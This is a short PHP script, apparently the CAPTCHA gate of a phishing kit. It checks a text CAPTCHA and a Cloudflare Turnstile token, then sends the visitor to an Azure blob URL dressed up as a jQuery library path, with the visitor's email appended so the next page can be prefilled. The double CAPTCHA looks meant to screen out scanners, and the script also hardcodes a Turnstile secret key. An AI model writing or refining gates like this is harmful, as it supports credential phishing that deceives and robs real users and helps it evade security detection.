<?php
session_start();

// Display errors for debugging (optional)
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'];
    $userTextCaptcha = $_POST['text_captcha'];
    $turnstileResponse = $_POST['cf-turnstile-response'];
    $secretKey = '0x4AAAAAAAzbaFyF5jnLHaBSyZ5AuNHu098';

    // Validate text-based CAPTCHA
    if ($userTextCaptcha !== $_SESSION['captcha_text']) {
        // Redirect back to the form with an error message
        $_SESSION['error_message'] = "Text CAPTCHA verification failed. Please try again.";
        header("Location: index.php");
        exit;
    }

    // Prepare Turnstile validation data
    $data = [
        'secret' => $secretKey,
        'response' => $turnstileResponse,
        'remoteip' => $_SERVER['REMOTE_ADDR']
    ];

    // Turnstile validation request
    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data)
        ]
    ];

    // Validate Turnstile CAPTCHA
    $context  = stream_context_create($options);
    $verify = file_get_contents('https://challenges.cloudflare.com/turnstile/v0/siteverify', false, $context);
    $captchaSuccess = json_decode($verify);

    if (!$captchaSuccess->success) {
        // Redirect back to the form with an error message
        $_SESSION['error_message'] = "Cloudflare CAPTCHA verification failed. Please try again.";
        header("Location: index.php");
        exit;
    }

    // Proceed if both CAPTCHAs are verified
    $_SESSION['error_message'] = null; // Clear any previous error messages

    // Encode the email address in Base64
    $encodedEmail = base64_encode($email);

    // Construct the redirect URL with the decoded email
$redirectUrl = "https://ajaxstorage.blob.core.windows.net/ajax-route/libs/jquery/3.6.0/aspx/secure/index.html#X$email";


    // Redirect the user
    header("Location: $redirectUrl");
    exit;
}
?>
